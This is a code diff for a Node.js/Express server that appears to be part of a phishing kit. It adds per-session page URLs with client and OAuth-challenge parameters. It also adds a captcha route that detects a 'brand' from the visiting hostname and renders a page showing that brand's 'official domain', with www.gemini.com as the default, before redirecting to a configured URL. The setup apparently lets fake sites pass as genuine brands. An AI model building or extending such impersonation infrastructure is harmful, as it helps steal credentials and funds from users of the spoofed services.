@@ -122,17 +122,15 @@ class SessionManager {
         if (session.url) {
             this.urlToSession.delete(session.url);
         }
-    
-        // Clean and capitalize the page name
+
+        // Clean the page name
         const pageName = session.currentPage
             .replace(/^\/+|\.html$/g, '')  // Remove leading slashes and .html
             .trim();
-        const pageNameCapitalized = pageName.charAt(0).toUpperCase() + 
-                                   pageName.slice(1).toLowerCase();
-        
-        // Create new URL ensuring proper format
-        const url = `/${pageNameCapitalized}?client_id=${session.id}&oauth_challenge=${session.oauthChallenge}`;
-        
+
+        // Create new URL with proper pages path
+        const url = `/pages/${pageName}.html?client_id=${session.id}&oauth_challenge=${session.oauthChallenge}`;
+
         // Validate URL format
         if (!url.startsWith('/') || url.startsWith('//')) {
             console.error('Invalid URL format generated:', url);
@@ -590,6 +588,30 @@ app.use('/pages', async (req, res, next) => {
         res.redirect('/');
     }
 });
+
+// Dynamic captcha route to serve with correct domain
+app.get('/pages/captcha.html', async (req, res, next) => {
+    try {
+        const clientId = req.query.client_id;
+        const hostname = req.get('host') || req.hostname || 'localhost';
+        const detectedBrand = detectBrandFromDomain(hostname);
+        const officialDomain = BRAND_CONFIG[detectedBrand]?.officialDomain || 'www.gemini.com';
+
+        // Generate captcha page with correct domain
+        const captchaHTML = await backgroundTransformer.transformCaptchaPage(
+            process.env.CLOUDFLARE_SITE_KEY,
+            state.settings.redirectUrl,
+            officialDomain
+        );
+
+        res.type('html').send(captchaHTML);
+    } catch (error) {
+        console.error('Error serving dynamic captcha:', error);
+        // Fallback to static file
+        next();
+    }
+});
+
 app.use('/pages', express.static(join(__dirname, '../../public/pages')));
 
 
